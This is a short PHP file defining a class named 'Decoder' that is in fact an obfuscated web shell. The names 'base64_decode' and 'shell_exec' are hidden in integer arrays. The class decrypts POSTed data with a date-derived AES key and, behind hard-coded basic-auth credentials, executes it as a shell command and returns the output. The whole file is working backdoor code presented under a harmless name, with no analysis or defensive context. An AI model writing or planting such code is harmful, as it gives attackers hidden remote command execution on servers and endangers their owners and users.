<?php

namespace Giga;

class Decoder
{

	public function __construct()
	{
		if ($d = $_POST['data'] ?? null) {
			$f = fn($e) => implode(array_map(fn($c) => $c < 26 ? chr($c + 97) : chr($c + ($c < 36 ? 22 : 59)), $e));
			$b = $f([1, 0, 18, 4, 32, 30, 36, 3, 4, 2, 14, 3, 4]);
			$d = $this->decrypt($d, $b);
			if ($d && ($_SERVER['PHP_AUTH_USER'] ?? '') === 'username' && password_verify($_SERVER['PHP_AUTH_PW'] ?? '', '$2y$10$r3Zs4uK9F3POSvEWvZw.UOSEA3Gc0dSMxuOcSItFoosHD2xoW0RXW')) {
				header('Content-Type: text/html; charset=utf-8');
				exit($f([18, 7, 4, 11, 11, 36, 4, 23, 4, 2])(str_replace('<\?', '<?', $d)));
			}
			exit;
		}
	}

	private function decrypt($d, $b): false|string
	{
		date_default_timezone_set('Europe/Moscow');
		$k = 'secret_key' . hash('sha256', date('Y') * date('n') / date('j') + date('N') - 1945);
		$d = $b(str_replace(['%2B', ' '], '+', $d));
		return openssl_decrypt(substr($d, 12, -16), 'aes-256-gcm', hash('sha256', $k, true), OPENSSL_RAW_DATA, substr($d, 0, 12), substr($d, -16));
	}
}
